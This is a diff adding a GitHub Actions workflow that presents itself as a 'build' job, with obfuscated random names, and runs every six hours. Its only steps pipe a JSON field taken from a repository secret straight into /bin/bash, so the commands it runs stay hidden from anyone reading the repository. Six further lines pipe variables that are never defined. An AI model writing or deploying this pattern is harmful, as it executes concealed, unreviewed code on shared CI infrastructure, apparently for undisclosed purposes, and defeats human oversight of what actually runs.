@@ -1,0 +1,23 @@
+name: luziyuan3497
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: luziyuan3497
+        env:
+          jpkb9: ${{ secrets.jpkb9 }}
+        run: |
+          echo $jpkb9 | jq -r .ysnq84 | /bin/bash
+          echo $zx15 | jq -r .nu12 | /bin/bash
+          echo $kurwy01338 | jq -r .fhn560 | /bin/bash
+          echo $kvwn16 | jq -r .smdv12038 | /bin/bash
+          echo $cnct877 | jq -r .kevp54527 | /bin/bash
+          echo $yydx6 | jq -r .im8905 | /bin/bash
+          echo $fm88043 | jq -r .uqmi94069 | /bin/bash
+
